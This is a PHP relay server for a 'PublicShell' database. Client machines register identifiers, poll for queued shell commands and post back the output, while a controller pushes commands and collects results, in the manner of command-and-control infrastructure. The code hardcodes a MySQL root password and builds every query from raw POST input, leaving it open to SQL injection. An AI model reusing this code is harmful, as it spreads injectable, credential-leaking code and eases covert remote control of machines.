<?php
$requestType = $_POST["requestType"];
$id = $_POST["id"];

$con = mysql_connect("localhost:3306","root","toor");
if (!$con)
{
	die('Could not connect: ' . mysql_error());
}
mysql_select_db("PublicShell", $con);

if( $requestType == "insertReceiver" )
{
	//Insert identifier into database
	//POST - requestType, identifier
	//Reply - 'true' on success
	if(mysql_query("INSERT INTO id VALUES ('" . $id . "')"))
		echo "true";
	else
		echo "false";
}

if( $requestType == "getCmd")
{
	//Keep querying db for cmds associated with identifier
	//POST - requestType, identifier
	//Reply - command to be executed
	
	$result = mysql_query("SELECT cmd FROM idcmd WHERE identifier='" . $id . "'");
	$row = mysql_fetch_array($result);
	$num = mysql_num_rows($result); 
	
	if($num == 0)
		echo "false";
	else
	{	
		$command = $row['cmd'];
		echo $command;
		mysql_query("DELETE FROM idcmd WHERE identifier='" . $id . "'");
	}
}

if( $requestType == "connect")
{
	//Check if identifier exists in database
	//POST - requestType, identifier
	//Reply - 'true' on success
	$result = mysql_query("SELECT * FROM id WHERE identifier='" . $id . "'");
	if($row = mysql_fetch_array($result))
		echo "true";
		
	else
		echo "false";
}

if( $requestType == "pushCmd")
{
	//Insert command into database, wait for output
	//POST - requestType, identifier, command
	//Reply - output pulled from db
	$cmd = $_POST["cmd"];
	if(mysql_query("INSERT INTO idcmd VALUES ('" . $id . "','". $cmd . "')"))
		echo "true";
		
	else
		echo "false";
}

if( $requestType == "getOutput")
{
	$result = mysql_query("SELECT op FROM idop WHERE identifier='" . $id . "'");
	$row = mysql_fetch_array($result);
	$num = mysql_num_rows($result); 
	
	if($num == 0)
		echo "false";
	else
	{	
		$op = $row['op'];
		echo $op;
		mysql_query("DELETE FROM idop WHERE identifier='" . $id . "'");
	}
}


if( $requestType == "output")
{
	//Insert output into database connected to an identifier (& command)??
	//POST - requestType, identifier, output
	//Reply - none/irrelevant

	$op = $_POST["output"];
	if(mysql_query("INSERT INTO idop VALUES ('" . $id . "','". $op . "')"))
		echo "true";
	else
		echo "false";
}

if( $requestType == "delUser")
{
	echo $id;
	echo $requestType;
	if(mysql_query("DELETE FROM id WHERE identifier='" . $id . "'"))
		echo "True";
		
	else
		echo "False";
}
?>
